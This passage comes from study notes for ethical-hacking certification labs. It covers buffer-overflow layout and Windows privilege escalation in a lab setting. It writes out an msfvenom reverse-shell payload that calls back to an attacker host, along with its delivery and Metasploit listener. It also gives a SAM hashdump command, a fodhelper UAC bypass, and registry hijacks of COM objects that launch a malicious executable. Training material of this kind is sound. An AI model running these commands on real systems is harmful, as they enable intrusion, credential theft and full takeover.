id="e14f9b61-fc58-4644-a633-ab21d6366aea" class="numbered-list" start="2"><li>Return Address to a found jmp that jumps to ESP</li></ol><ol type="1" id="69ce6433-b81f-49d0-9cbb-793cd2a3828b" class="numbered-list" start="3"><li>Nop Sled</li></ol><ol type="1" id="a29c7610-eced-439e-84bb-4cf3c3db35c3" class="numbered-list" start="4"><li>Payload</li></ol></li></ul><ul id="b796440a-b91d-487c-a5fb-5917fa79bcae" class="bulleted-list"><li style="list-style-type:disc">First, the buffer is overflowed</li></ul><ul id="ee945410-1f05-4d29-b0fe-d712feda6b10" class="bulleted-list"><li style="list-style-type:disc">The execution continues because no executable code is overwritten, just the contents of the stack</li></ul><ul id="d7e9d5dc-dcd0-466a-9d8c-a763b7c6d69f" class="bulleted-list"><li style="list-style-type:disc">The execution ends and the Return Address is reached</li></ul><ul id="9fbd83be-cd6e-4d5b-b475-a7448b7f6e55" class="bulleted-list"><li style="list-style-type:disc">The ESP and EBP are restored to the previous stack frame of the parent function</li></ul><ul id="a54e85d4-57ab-4026-b4b1-5e826cb6208f" class="bulleted-list"><li style="list-style-type:disc">Return Address is changed by our shellcode to the address of a JMP ESP</li></ul><ul id="b685275f-e4dc-4a70-9155-dca84d976d68" class="bulleted-list"><li style="list-style-type:disc">The execution proceeds to start executing code from the location of ESP<ul id="0e0e670f-4e41-4be6-8220-e5ca09641d4c" class="bulleted-list"><li style="list-style-type:circle">The JMP ESP instruction is commonly used in dynamic code execution where the function to be executed is saved as a pointer to it and is determined to be run during execution</li></ul></li></ul><ul id="72272367-c823-445e-97b7-2878c54df946" class="bulleted-list"><li style="list-style-type:disc">But the location of ESP is one frame below the previous frame, so the overflow has rewritten whats there to NOP operations</li></ul><ul id="2881b86a-b384-47e1-ae9f-17172ddc088d" class="bulleted-list"><li style="list-style-type:disc">So it slides down to the payload and starts executing it</li></ul></details></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="031b62fd-76a4-43df-9fac-7309e8d1bb80" class="toggle"><li><details open=""><summary>Privilege Escalation</summary><p id="dc4e1967-7e15-46e1-bcdc-002825a98f5e" class="">Here, we will find misconfigurations in the target system using BeRoot and Seatbelt and further escalate privileges by exploiting client-side vulnerabilities.</p><p id="337d71ce-a253-40ff-a755-913a4759c487" class="">
</p><ul id="37e764e9-17c1-45c3-af9c-fc2dc8c893ec" class="toggle"><li><details open=""><summary>Preparation: Pass a simple meterpreter shell to victim just to get access</summary><ul id="5718e7c1-a5be-4727-8b05-dd174f6e2870" class="toggle"><li><details open=""><summary>Create an exploit</summary><ul id="e4d88dd7-f29f-47e4-8334-fb481387a055" class="bulleted-list"><li style="list-style-type:disc"><code><strong>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b &quot;\x00&quot; LHOST=&lt;attacker&gt; -f exe &gt; /home/attacker/Desktop/Exploit.exe</strong></code></li></ul></details></li></ul><ul id="355b29ea-acc9-4635-a6ff-51bc75098943" class="toggle"><li><details open=""><summary>Share it with victim</summary><ul id="a385b70b-a072-4054-9d28-e077528a2120" class="bulleted-list"><li style="list-style-type:disc">Type <strong>mkdir /var/www/html/share</strong> and press <strong>Enter</strong> to create a shared folder</li></ul><ul id="8936d574-d155-4228-844c-e315f0cdb16f" class="bulleted-list"><li style="list-style-type:disc">Type <strong>chmod -R 755 /var/www/html/share</strong> and press <strong>Enter</strong></li></ul><ul id="8dcda0be-69de-440d-b224-d11316d0316c" class="bulleted-list"><li style="list-style-type:disc">Type <strong>chown -R www-data:www-data /var/www/html/share</strong> and press <strong>Enter</strong></li></ul><ul id="8475874c-d494-4197-a509-65fc53b86f41" class="bulleted-list"><li style="list-style-type:disc">Type <strong>cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/</strong> and press <strong>Enter</strong></li></ul><ul id="a4c2fded-f102-412f-b82a-468f5680671e" class="bulleted-list"><li style="list-style-type:disc">Type <strong>service apache2 start</strong> and press <strong>Enter</strong></li></ul></details></li></ul><ul id="e3e561a7-4663-4911-9aa7-60d21a6ae1d8" class="toggle"><li><details open=""><summary>Run a listener on the exploit</summary><ul id="d7bf2ddf-bf20-4d4e-a9cd-cdfcf4f281bd" class="bulleted-list"><li style="list-style-type:disc">Type <strong>msfconsole</strong></li></ul><ul id="23e50b97-cd03-4b7c-8341-2f6df964d064" class="bulleted-list"><li style="list-style-type:disc">Type <strong>use exploit/multi/handler</strong></li></ul><ul id="ece48597-df60-4826-a2cb-2f12f84647ff" class="bulleted-list"><li style="list-style-type:disc">Type <strong>set payload windows/meterpreter/reverse_tcp</strong> and press <strong>Enter</strong></li></ul><ul id="70ccf06b-1f85-4e1e-9975-a8d7a94919de" class="bulleted-list"><li style="list-style-type:disc">Type <strong>set LHOST &lt;attacker IP&gt;</strong> and press <strong>Enter</strong></li></ul><ul id="1ac95671-2bbf-43b1-b3bf-a30d6cb09dee" class="bulleted-list"><li style="list-style-type:disc">Type <strong>exploit -j -z</strong> and press <strong>Enter</strong>.<ul id="faeba21d-c404-4223-905c-98c09e37165b" class="bulleted-list"><li style="list-style-type:circle"><code>-j</code> Runs in the background</li></ul><ul id="dcc6d94d-7eea-454f-8fb0-6eac2cf0726c" class="bulleted-list"><li style="list-style-type:circle"><code>-z</code> Does not interact with session after successful exploitation, leave it in the background</li></ul></li></ul></details></li></ul><ul id="6cd8fa9d-eaa7-4208-b769-2a58fb553fb2" class="toggle"><li><details open=""><summary>Run the exploit on victim</summary><ul id="8a0a6876-717a-4f01-9771-81ea82c4f349" class="bulleted-list"><li style="list-style-type:disc">Go to <strong>http://10.10.1.13/share</strong></li></ul><ul id="973869c9-e1c2-4a41-a4fb-30e7f06f8ed9" class="bulleted-list"><li style="list-style-type:disc">Download and run <strong>exploit.exe</strong></li></ul><ul id="8893e121-5e3b-4137-9383-5b722287178b" class="bulleted-list"><li style="list-style-type:disc">Metasploit should notify that session 1 is opened</li></ul><ul id="1d99166f-76cd-490b-bf30-059f22267dac" class="bulleted-list"><li style="list-style-type:disc">Type <code>sessions -i 1</code> to get the session<br/><br/></li></ul></details></li></ul></details></li></ul><ul id="06fc88ef-85c1-4f1b-83e4-fb1d0b7be9a1" class="toggle"><li><details open=""><summary>Using BeRoot to find local vulnerabilities</summary><p id="fec442f8-0951-4065-a770-4f99c38a5c8e" class="">Windows privileges can be used to escalated privileges. </p><p id="4434d89d-78ba-4df3-b890-847f91230176" class="">These privileges include SeDebug, SeRestore &amp; SeBackup &amp; SeTakeOwnership, SeTcb &amp; SeCreateToken, SeLoadDriver, and SeImpersonate &amp; SeAssignPrimaryToken.</p><p id="56b24035-40cd-4269-8e21-21e96f4fb019" class=""> BeRoot lists all available privileges and highlights if you have one of these tokens.</p><p id="f4f64c33-de3d-4734-96b3-d5ac7f8506ef" class="">
</p><ul id="35dd4533-c99c-43da-9fe8-34eef6032616" class="bulleted-list"><li style="list-style-type:disc">Copying BeRoot to victim machine<ul id="fe5b92ec-3a18-4220-a5cc-9a6d8b751ad4" class="bulleted-list"><li style="list-style-type:circle">Executable can be found at <code><strong>CEHv12 Module 06 System Hacking\Privilege Escalation Tools\BeRoot</strong></code></li></ul><ul id="7257c48d-0d91-4647-b40d-0b208f6e769f" class="bulleted-list"><li style="list-style-type:circle">Copy BeRoot to Desktop</li></ul><ul id="51091333-b5eb-4035-8a47-62448c4833c5" class="bulleted-list"><li style="list-style-type:circle">In meterpreter, type <code>upload /home/attacker/Desktop/beRoot.exe</code></li></ul></li></ul><ul id="4bfe9a3f-0a43-499e-972d-a42a9eed99dd" class="bulleted-list"><li style="list-style-type:disc">Running BeRoot<ul id="b2632c04-ea05-4477-9fa3-a47c4cda3953" class="bulleted-list"><li style="list-style-type:circle">In meterpreter, type <code>shell</code></li></ul><ul id="46b12a74-a349-4b1f-8314-ded7b6840104" class="bulleted-list"><li style="list-style-type:circle">Type <code>beRoot.exe</code> to run</li></ul><ul id="90676348-e01d-4321-9bdc-ebf0585e0269" class="toggle"><li><details open=""><summary>A result appears, displaying information about</summary><ul id="83ac1f93-56f4-4b96-9106-9992c06c8b77" class="bulleted-list"><li style="list-style-type:disc">service names and permissions</li></ul><ul id="3faa70e0-72aa-46c1-a1a9-f30ed61526e3" class="bulleted-list"><li style="list-style-type:disc">keys</li></ul><ul id="c6f7a80a-15d7-4b02-bc0c-7e274545fe09" class="bulleted-list"><li style="list-style-type:disc">writable directories</li></ul><ul id="fc760653-d27e-4b48-a86a-f848e3ae0092" class="bulleted-list"><li style="list-style-type:disc">locations</li></ul><ul id="82e0a523-a044-43c4-9ebf-01016400fd6f" class="bulleted-list"><li style="list-style-type:disc">startup keys</li></ul><ul id="b54f9bf6-7719-4bfe-9e91-a1a5f85e37c4" class="bulleted-list"><li style="list-style-type:disc">task schedulers</li></ul><ul id="3633db7d-9153-4e45-9674-6d396a437617" class="bulleted-list"><li style="list-style-type:disc">WebClient vulnerabilities</li></ul><ul id="02780d38-3ca5-4120-873c-a04c9348d1b0" class="bulleted-list"><li style="list-style-type:disc">etc</li></ul></details></li></ul><ul id="b86e41cd-0464-432f-ab53-9676d208f009" class="toggle"><li><details open=""><summary>How this information can be helpful</summary><ul id="6edcf053-3de5-4f6e-bece-e5eb2c3251b7" class="bulleted-list"><li style="list-style-type:disc"><strong>Writable Directories</strong>:<ul id="5da08b92-dc31-48de-ae74-449578e7265e" class="bulleted-list"><li style="list-style-type:circle">Writable directories refer to file system directories where the current user or a non-privileged user has write permissions. These directories can be significant in a privilege escalation context for several reasons:<ul id="b83643b1-4355-4b84-8a74-364ef7315f96" class="bulleted-list"><li style="list-style-type:square"><strong>Malicious Executables</strong>: An attacker could place a malicious executable or script in a writable directory, especially if that directory is part of a path that a privileged service or executable accesses.</li></ul><ul id="a4976cbb-7798-4d5d-adfa-a1d9c3c25074" class="bulleted-list"><li style="list-style-type:square"><strong>DLL Hijacking</strong>: Writable directories can be exploited for DLL hijacking attacks, where a malicious DLL is placed in a directory that a vulnerable application uses, causing the application to load the malicious DLL instead of the legitimate one.</li></ul></li></ul></li></ul><ul id="4bd16d6e-7123-4382-ba29-9c623dd79d62" class="bulleted-list"><li style="list-style-type:disc"><strong>Change Config (Change Configuration)</strong>:<ul id="9801ffb0-0b03-4cb7-8d73-2f8487c7257e" class="bulleted-list"><li style="list-style-type:circle">This refers to the permission to modify the configuration settings of a service. If a service has <code>change_config</code> permissions and the attacker has these permissions, they can:<ul id="163b9685-807c-4f91-aef9-5ad47bf10154" class="bulleted-list"><li style="list-style-type:square"><strong>Change the Executable Path</strong>: The attacker can change the path to the executable that the service runs, pointing it to a malicious executable instead.</li></ul><ul id="2544039c-3bbc-48f3-b7ca-84bc0d853825" class="bulleted-list"><li style="list-style-type:square"><strong>Manipulate Service Settings</strong>: Modify settings such as service dependencies, which could potentially lead to executing arbitrary code under the context of the service.</li></ul></li></ul></li></ul><ul id="e7a639b7-7b95-4aa7-8c6f-976aed810910" class="bulleted-list"><li style="list-style-type:disc"><strong>Start and Stop Permissions</strong>:<ul id="cb40ad2d-0797-40c1-ad07-c2694f3f801f" class="bulleted-list"><li style="list-style-type:circle"><code>Start</code> and <code>stop</code> permissions on a service mean that the user can start or stop the service, respectively. These permissions are important because:<ul id="f21c2fe8-38a2-4d18-a252-64ad059c925e" class="bulleted-list"><li style="list-style-type:square"><strong>Controlled Execution</strong>: If an attacker can change the configuration of a service to point to a malicious executable, they can then start the service to execute their code.</li></ul><ul id="79c61f74-2fa7-4223-9e08-f86365513075" class="bulleted-list"><li style="list-style-type:square"><strong>Persistence</strong>: By stopping a legitimate service and replacing it with a malicious one, attackers can maintain persistence on the system.</li></ul></li></ul></li></ul></details></li></ul><ul id="a767babc-982d-43e1-98eb-af6fbbc2c519" class="bulleted-list"><li style="list-style-type:circle">Type <code>exit</code> to exit shell</li></ul></li></ul></details></li></ul><ul id="e5e32657-563d-4181-9434-f5f3476348e8" class="toggle"><li><details open=""><summary>Using GhostPack Seatbelt to find local vulnerabilities</summary><ul id="2299a06d-35a7-496d-b588-66df2df9618d" class="bulleted-list"><li style="list-style-type:disc">Copy to GhostPack Seatbelt to victim machine<ul id="08c6eb5f-8dd0-4f3c-a5fa-c61f8604e8ce" class="bulleted-list"><li style="list-style-type:circle">Executable can be found at <code><strong>CEHv12 Module 06 System Hacking\Github Tools</strong></code></li></ul><ul id="cfc0b86c-1cc9-47a3-a530-718b70797fea" class="bulleted-list"><li style="list-style-type:circle">Copy <code>Seatbelt.exe</code> to desktop</li></ul><ul id="e47f8776-6e08-4b0a-a534-04f956fd7d2e" class="bulleted-list"><li style="list-style-type:circle">In meterpreter, type <code>upload /home/attacker/Desktop/Seatbelt.exe</code> </li></ul></li></ul><ul id="9acd5686-80bc-43d9-a61a-e99b0a170963" class="bulleted-list"><li style="list-style-type:disc">Running GhostPack Seatbelt<ul id="19760dbc-894f-42f4-b72b-dda157fdb206" class="bulleted-list"><li style="list-style-type:circle">In meterpreter, type <code>shell</code></li></ul><ul id="042dbc4b-4b8d-4793-b733-b017b6a88a0d" class="bulleted-list"><li style="list-style-type:circle">Type <code>Seatbelt.exe -group=system</code> to gather information about AMSIProviders, AntiVirus, AppLocker etc.</li></ul><ul id="eeebc776-a22c-4b28-83db-76331c802a56" class="bulleted-list"><li style="list-style-type:circle">Type <code>Seatbelt.exe -group=user</code> to gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.</li></ul><ul id="6b2f2093-d32e-45fb-9871-287583c21f3d" class="bulleted-list"><li style="list-style-type:circle">Type <code>Seatbelt.exe -group=misc</code> to gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc</li></ul><ul id="c140bf05-432b-47cf-8edf-282eac5c7501" class="toggle"><li><details open=""><summary>All commands for Seatbelt</summary><figure id="413d2081-7fd7-4a5a-9cb2-77c929d252c0" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2093.png"><img style="width:619.2000122070312px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2093.png"/></a></figure></details></li></ul></li></ul></details></li></ul><ul id="e8055922-5abe-4783-9a52-a8cb75ef1391" class="toggle"><li><details open=""><summary>Hashdump SAM file from metasploit session</summary><p id="e26d100f-a5d1-441d-8cd9-96d450cd9ac8" class="">This requires administrative or root privileges</p><ul id="88770d90-03ec-4442-a1f9-04b1939d4c20" class="bulleted-list"><li style="list-style-type:disc">Type <code>run post/windows/gather/smart_hashdump</code> in the metasploit session</li></ul><ul id="5f099edb-f018-4025-bc72-140a4c823903" class="bulleted-list"><li style="list-style-type:disc">Doesnt work if no elevated privilages</li></ul></details></li></ul><ul id="3d17e264-9faa-4328-8981-e6cb5738ff28" class="toggle"><li><details open=""><summary>Use Named Pipe Impersonation to escalate privileges</summary><ul id="646b6d92-384b-411e-9b34-67e61f34ef31" class="toggle"><li><details open=""><summary>What is Named Pipe Impersonation?</summary><p id="3c145be4-e2cf-40fa-b750-b7defa609c72" class=""><strong>Named Pipes</strong> are a method for inter-process communication (IPC) on Windows. They allow data to be communicated between processes, either on the same machine or over the network.</p><h3 id="34bdc3e7-1c27-45a9-b89f-b05491a33d5f" class="">What is Named Pipe Impersonation?</h3><p id="12aa1ad7-b2a7-4512-86e9-ea9b04dce726" class="">Named Pipe Impersonation is a technique used to escalate privileges by exploiting the way Windows handles authentication and permissions in named pipes.</p><h3 id="8dda9bca-5935-435c-81f8-d71fa2a552ed" class="">How Named Pipe Impersonation Works</h3><ol type="1" id="8e9005b9-13bb-47ff-b05d-66f12feb30a8" class="numbered-list" start="1"><li><strong>Server and Client Interaction</strong>:<ul id="93c7cf2e-e6c5-4dc3-9e89-e2d656fc88e0" class="bulleted-list"><li style="list-style-type:disc">Typically, a higher-privileged process (server) provides a named pipe service, and lower-privileged processes (clients) connect to this named pipe to request services.</li></ul></li></ol><ol type="1" id="159e17a2-6556-4f9b-b12a-c9d868663780" class="numbered-list" start="2"><li><strong>Impersonation in Named Pipes</strong>:<ul id="d476a9ab-4cfa-46fc-824f-9c12f5b1037d" class="bulleted-list"><li style="list-style-type:disc">When a server accepts a connection on a named pipe, it can impersonate the client, adopting the client&#x27;s security context (user identity and permissions) for the duration of the connection.</li></ul></li></ol><ol type="1" id="d5e6d255-32dc-43ed-9c1f-401406abd914" class="numbered-list" start="3"><li><strong>Exploitation Process</strong>:<ul id="213d3d76-8068-45a0-9ba0-d18bf2df4bdc" class="bulleted-list"><li style="list-style-type:disc">An attacker running a lower-privileged process (malicious client) can create a named pipe and trick a higher-privileged service (legitimate server) into connecting to it. If the server tries to connect and authenticate over this named pipe, the attacker can impersonate the server&#x27;s higher-privileged account.</li></ul></li></ol><p id="5045e094-b251-4fb8-8238-8a7a217fab03" class=""><strong>Practical Example</strong>:</p><ul id="4baa9504-6ea0-448d-8615-beba9d8d99c6" class="bulleted-list"><li style="list-style-type:disc"><strong>Step 1</strong>: The attacker creates a named pipe and sets it to allow connections.</li></ul><ul id="8199521d-9c74-4c99-892b-2b61e50faccd" class="bulleted-list"><li style="list-style-type:disc"><strong>Step 2</strong>: The attacker waits for or tricks a higher-privileged service to connect to this named pipe.</li></ul><ul id="fd576631-8650-44ad-9e26-82e1e4b40004" class="bulleted-list"><li style="list-style-type:disc"><strong>Step 3</strong>: Once the higher-privileged service connects, the attacker uses Windows API functions (e.g., <code>ImpersonateNamedPipeClient</code>) to impersonate the service, thereby gaining its privileges.</li></ul><h3 id="592d2784-8c28-4851-a542-056fdceb5942" class="">Why Use Named Pipe Impersonation?</h3><ul id="1e6d9a95-0b39-45db-ad2e-f9e80c9bff0a" class="bulleted-list"><li style="list-style-type:disc"><strong>Privilege Escalation</strong>: This technique is used to escalate privileges from a lower-privileged account (like a standard user) to a higher-privileged account (like SYSTEM or Administrator).</li></ul><ul id="1223e149-6ebb-4060-a1e9-96a018269534" class="bulleted-list"><li style="list-style-type:disc"><strong>Exploiting Weak Service Configurations</strong>: Some services may connect to named pipes without properly validating the pipe&#x27;s ownership or origin, making them susceptible to impersonation attacks.</li></ul></details></li></ul><ul id="530ba03e-a428-4c2f-be94-01fc618fe7ab" class="bulleted-list"><li style="list-style-type:disc">Run <code>getsystem -t 1</code> inside the meterpreter shell</li></ul><ul id="9e452b32-76fb-465e-ba40-95768e2a4cd2" class="bulleted-list"><li style="list-style-type:disc">Might need appropriate privileges, needs UAC bypass</li></ul></details></li></ul><ul id="dffc4a19-a464-4258-be9c-49207e5737db" class="toggle"><li><details open=""><summary>Bypassing User Access Control (UAC)</summary><p id="62b16e61-a0cc-45a1-a024-fe7622c4eb0a" class="">UAC is the prompt that appears to accept running something as an administrator</p><ul id="d6e657c3-08ad-4043-ba5a-41b4eb3dc9f9" class="toggle"><li><details open=""><summary>tl;dr</summary><p id="ef26f3ac-4a50-4af7-8760-46f23a687045" class="">fodhelper is a windows trusted executable that runs something in the registry</p><p id="42156623-36d5-49fc-bb75-6d73e45d720f" class="">So the script modifies the registry to run the payload</p><p id="08cc653b-2817-4450-a033-f8fa9ebe5823" class="">It uses the fodhelper.exe to bypass UAC and open a new shell</p></details></li></ul><ul id="7a01891f-d0a9-4ec6-83b5-e1fed01d539c" class="toggle"><li><details open=""><summary>How it works</summary><h3 id="4e4d580d-ddc3-4bc4-856e-26fadf69f2cd" class="">Step-by-Step Breakdown:</h3><ol type="1" id="8562d2ef-2df7-42a2-9b58-027478865819" class="numbered-list" start="1"><li><strong>Target FOD Helper</strong>:<ul id="b11c1d15-5637-40a9-b0f7-d47033afdb59" class="bulleted-list"><li style="list-style-type:disc"><code>fodhelper.exe</code> is an executable included in Windows to manage optional features. It is trusted by the operating system and runs with elevated privileges.</li></ul></li></ol><ol type="1" id="a10b831d-3cc6-40d7-8f1e-e6b17380451a" class="numbered-list" start="2"><li><strong>Registry Hijacking</strong>:<ul id="eff4390c-c639-490f-bf60-525733466e8f" class="bulleted-list"><li style="list-style-type:disc">The exploit takes advantage of a UAC bypass technique involving the Windows Registry. Specifically, it modifies a registry key to point to an attacker-controlled script or executable.</li></ul></li></ol><ol type="1" id="71a0d74b-6371-433f-a683-bff2664a06b1" class="numbered-list" start="3"><li><strong>Registry Modification</strong>:<ul id="7d1eca73-4215-43bd-8d93-d4c4698f9bca" class="bulleted-list"><li style="list-style-type:disc">The exploit modifies the following registry keys:<ul id="3d86118c-150d-4320-95e7-dea92b6e8a4c" class="bulleted-list"><li style="list-style-type:circle"><code>HKCU\Software\Classes\ms-settings\shell\open\command</code></li></ul><ul id="761116e3-d151-494d-b850-ac850a1de05a" class="bulleted-list"><li style="list-style-type:circle"><code>HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute</code></li></ul></li></ul><ul id="e12136bc-121b-4a1b-b191-0ec09542a18a" class="bulleted-list"><li style="list-style-type:disc">It sets these keys to execute a command or script with administrative privileges.</li></ul></li></ol><ol type="1" id="e047a228-b1b8-4ad1-8f1d-cd3ca160fe9b" class="numbered-list" start="4"><li><strong>Execution</strong>:<ul id="01584298-0339-48b8-89c4-852dc2164415" class="bulleted-list"><li style="list-style-type:disc">When <code>fodhelper.exe</code> is launched, it references these registry keys. The modified keys point to the attacker&#x27;s payload, which is then executed with elevated privileges.</li></ul></li></ol><ol type="1" id="06bd375b-9ecb-4a82-9b73-7d2af41188cc" class="numbered-list" start="5"><li><strong>Payload Execution</strong>:<ul id="cc98398e-c84f-4c1d-a55f-215fec4a8829" class="bulleted-list"><li style="list-style-type:disc">The payload specified in the registry is executed with elevated privileges, effectively bypassing the UAC prompt and granting an administrative shell to the attacker.</li></ul></li></ol></details></li></ul><ul id="c35f8a64-10db-4c95-8bed-c746dd870395" class="toggle"><li><details open=""><summary>COM Objects</summary><ul id="acd7c57b-88e3-49b3-a2df-36ae96a2cd8f" class="bulleted-list"><li style="list-style-type:disc"><strong>COM Objects</strong>: Reusable software components that follow the COM standard, used for modular and interoperable software development.</li></ul><ul id="25580b1f-5972-4685-9f01-ab958fc2c7f5" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose</strong>: Enable language-independent, reusable, and extensible software components.</li></ul><ul id="3858a0d8-6eb7-4e5b-9301-151ff0f3ef1f" class="bulleted-list"><li style="list-style-type:disc"><strong>Penetration Testing Use</strong>: Useful for UAC bypass, persistence, and privilege escalation by exploiting auto-elevating COM objects and registry modifications.</li></ul><ul id="78920fec-a3f3-4d4a-85a4-e0e1e5e30d7b" class="bulleted-list"><li style="list-style-type:disc"><strong>UAC Bypass Mechanism</strong>: Involves modifying registry keys to redirect auto-elevating COM objects to execute malicious code with elevated privileges.</li></ul></details></li></ul><ul id="7d7ba80c-3f48-41c4-ac17-a9fdbd3fa14e" class="toggle"><li><details open=""><summary>Known COM Objects that can be exploited</summary><h3 id="e30316a8-88e9-480a-9bd5-06b45d029cf2" class="">1. <strong>ISecurityEditor</strong></h3><p id="d5b41651-2cbd-41a9-81cd-ab14ce264941" class=""><strong>Description</strong>: A COM object related to security settings.</p><p id="543dd0a7-7218-49df-81cd-4ab306acb846" class=""><strong>Registry Key</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="41db7475-c786-4e7f-b69f-564d1405e715" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">plaintextCopy code
HKCU\Software\Classes\CLSID\{7B37783E-7B37-4DFF-9D82-AC22E012329E}\LocalServer32

</code></pre><p id="7e96dc93-e68f-4d89-a7ff-62bbb9ed8d4d" class=""><strong>Exploitation</strong>:</p><ol type="1" id="a55084a1-badc-45fa-a2b5-a233187dad24" class="numbered-list" start="1"><li>Modify the registry to point to a malicious executable.</li></ol><ol type="1" id="fad5e19f-0969-4a05-9740-a74a838dc93f" class="numbered-list" start="2"><li>Trigger the COM object to execute the payload with elevated privileges.</li></ol><p id="3d44232a-a08f-4a5e-9e42-ecdb5fc4fc03" class=""><strong>Example</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a250662b-1328-4054-a9ed-f359ee047340" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershellCopy code
reg add HKCU\Software\Classes\CLSID\{7B37783E-7B37-4DFF-9D82-AC22E012329E}\LocalServer32 /d &quot;C:\path\to\malicious.exe&quot; /f
$securityEditor = New-Object -ComObject &quot;ISecurityEditor&quot;

</code></pre><h3 id="ed5f2f45-2642-4128-b0fb-8ded0d172dda" class="">2. <strong>ShellExecute via Shell.Application</strong></h3><p id="3e29c8d4-e57a-4e0d-8bb8-6bbd00c214cb" class=""><strong>Description</strong>: Part of the Shell.Application object, often used for launching programs.</p><p id="337dd6ef-2f8f-4916-b5b4-545ae28a157f" class=""><strong>Registry Key</strong>: Not directly used in this method, as it leverages the <code>Shell.Application</code> object.</p><p id="ac11f21b-03d2-434e-b5ca-9bfb4aa92109" class=""><strong>Exploitation</strong>:</p><ol type="1" id="b0a6bf66-2885-4883-b36b-4b23d5220cc3" class="numbered-list" start="1"><li>Use PowerShell to create a COM object instance and execute a command with elevated privileges.</li></ol><p id="2be86b82-f70f-46e3-9a14-fe3155285f82" class=""><strong>Example</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7eac25a7-a276-485e-8bc0-619214448c90" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">powershellCopy code
$service = New-Object -ComObject &quot;Shell.Application&quot;
$service.ShellExecute(&quot;powershell&quot;, &quot;-Command Start-Process notepad.exe -Verb runAs&quot;, &quot;&quot;, &quot;runas&quot;, 1)

</code></pre><h3 id="b2cae00d-c896-44b3-81e5-53ad98ecdaea" class="">3. <strong>ComputerDefaults</strong></h3><p id="62882cc4-c05f-45c5-8d05-0f314365281e" class=""><strong>Description</strong>: Used to set default programs for certain tasks in Windows.</p><p id="7602065f-c2f5-4451-93c9-e55c1b89038e" class=""><strong>Registry Key</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dc5577d9-a209-4259-8d68-5c83db775dd6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">plaintextCopy code
HKCU\Software\Classes\ms-settings\shell\open\command

